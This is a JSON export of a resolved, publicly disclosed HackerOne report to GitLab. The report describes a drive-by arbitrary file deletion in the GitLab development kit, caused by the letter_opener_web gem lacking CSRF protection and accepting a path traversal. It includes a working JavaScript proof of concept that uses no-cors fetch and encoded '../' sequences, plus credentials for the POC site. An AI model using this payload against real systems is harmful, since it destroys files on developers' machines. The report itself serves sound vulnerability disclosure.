{
  "id": 1353103,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzUzMTAz",
  "url": "https://hackerone.com/reports/1353103",
  "title": "Drive-by arbitrary file deletion in the GDK via letter_opener_web gem",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-09-27T23:20:24.708Z",
  "submitted_at": "2021-09-27T23:20:24.866Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8113d7f5fac58d42b7fe6e9473348bb5145a30f162e9e06c070ceb03ffb87b25"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-12T20:29:13.357Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-12T20:29:13.157Z",
  "team_member_agreed_on_going_public_at": "2021-11-12T18:54:00.255Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\nWhen running gitlab in development, an extra gem used to view emails that have been sent:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v14.3.0-ee/config/routes/development.rb#L14\n```ruby\nmount LetterOpenerWeb::Engine, at: '/rails/letter_opener'\n```\n\nOne of the routes it adds is to delete a letter:\nhttps://github.com/fgrehm/letter_opener_web/blob/v1.4.0/app/controllers/letter_opener_web/letters_controller.rb#L38\n```ruby\n\n    def destroy\n      @letter.delete\n      redirect_to routes.letters_path\n    end\n\n    private\n   def load_letter\n      @letter = Letter.find(params[:id])\n      head :not_found unless @letter.exists?\n    end\n```\n\nThe find and delete methods for `Letter` are:\n\nhttps://github.com/fgrehm/letter_opener_web/blob/v1.4.0/app/models/letter_opener_web/letter.rb#L23\n```ruby\n    def self.find(id)\n      new(id: id)\n    end\n\n    def initialize(params)\n      @id      = params.fetch(:id)\n      @sent_at = params[:sent_at]\n    end\n\n    def delete\n      FileUtils.rm_rf(\"#{LetterOpenerWeb.config.letters_location}/#{id}\")\n    end\n```\n\nThe delete route has no CSRF protection or authentication, so the only protection is CORS. Using fetch to post with `_method=delete` and `no-cors` allows the route to be hit without triggering a preflight check as it is considered a simple request.\n\nIn order to delete files outside of `letters_location`, the id needs to contain `../` and for this to happen the path needs to be encoded as `%2e%2e%2f`.  Luckily chrome will automatically decode `%2e` to `.` and the request will never make it to the letter opener route. Firefox and Safari do not do this, and so can be used to trigger the file delete.\n\n### Steps to reproduce\n\n1. Setup the GDK: https://gitlab.com/gitlab-org/gitlab-development-kit/-/blob/main/doc/index.md#one-line-installation\n2. Ensure that gitlab is running on http://localhost:3000/\n3. Login and setup the admin user\n4. Visit http://localhost:3000/rails/letter_opener and check that there are some letters waiting\n5. Create a file `/tmp/something` with some contents\n6. Visit https://gdk.vakzz.me/ in firefox or safari (basic auth is `bb` / `924VYZF4BcB53vwa`)\n7. Enter `/tmp/something` and click delete\n8. See that the file `/tmp/something` has been deleted\n\n### Impact\nAllows a malicious website to delete arbitrary files or folders on a developers computer if visited using Firefox or Safari\n\n### Examples\nPOC at https://gdk.vakzz.me (basic auth is `bb` / `924VYZF4BcB53vwa`)\n\nThe delete code from the above site is:\n```javascript\n        function deleteFile() {\n            const fileToDelete = fileInput.value;\n            fileInput.value = \"\";\n\n            const path = \"%2e%2e%2f\".repeat(20) + encodeURIComponent(fileToDelete);\n            const url = `http://127.0.0.1:3000/rails/letter_opener/${path}`\n            \n            const form = new FormData()\n            form.append(\"_method\", \"DELETE\")\n            return fetch(url, { method: 'POST', body: form, mode: \"no-cors\" });\n        }\n```\n\n### What is the current *bug* behavior?\n* No CSRF protection on the letter_opener routes\n\n### What is the expected *correct* behavior?\n* They should have CSRF protection\n\n### Relevant logs and/or screenshots\nDemo:\n{F1463526}\n\n### Output of checks\n#### Results of GitLab environment info\n```\nSystem information\nSystem:\t\tUbuntu 20.04\nProxy:\t\tno\nCurrent User:\tvagrant\nUsing RVM:\tno\nRuby Version:\t2.7.4p191\nGem Version:\t3.1.6\nBundler Version:2.1.4\nRake Version:\t13.0.6\nRedis Version:\t6.0.15\nGit Version:\t2.33.0\nSidekiq Version:5.2.9\nGo Version:\tgo1.16.8 linux/amd64\n\nGitLab information\nVersion:\t14.4.0-pre\nRevision:\tb757b9f532c\nDirectory:\t/home/vagrant/gitlab-development-kit/gitlab\nDB Adapter:\tPostgreSQL\nDB Version:\t12.6\nURL:\t\thttp://127.0.0.1:3000\nHTTP Clone URL:\thttp://127.0.0.1:3000/some-group/some-project.git\nSSH Clone URL:\tssh://git@127.0.0.1:2222/some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: google_oauth2\n\nGitLab Shell\nVersion:\t13.21.1\nRepository storage paths:\n- default: \t/home/vagrant/gitlab-development-kit/repositories\nGitLab Shell path:\t\t/home/vagrant/gitlab-development-kit/gitlab-shell\nGit:\t\t/usr/bin/git\n```\n\n## Impact\n\nAllows a malicious website to delete arbitrary files or folders on a developers computer if visited using Firefox or Safari",
  "bounty_amount": "750.0",
  "formatted_bounty": "$750",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1463526,
      "file_name": "delete_poc.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/atah6x1cyd5ms3zvdz6tdepugycc?response-content-disposition=attachment%3B%20filename%3D%22delete_poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27delete_poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cf23e837a3c2e9a78cbe7bbd4dd39ed290911414c3a517f452a1534d778762d7",
      "file_size": 2333770,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 24,
  "voters": [
    "ovunc",
    "n1m0",
    "dee-see",
    "fqdn",
    "rzx007x",
    "akashhamal0x01",
    "011alsanosi",
    "odinshell",
    "official_blackhat13",
    "onorbayar",
    "and 14 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 55897,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://gitlab.com/gitlab-org/gitlab",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
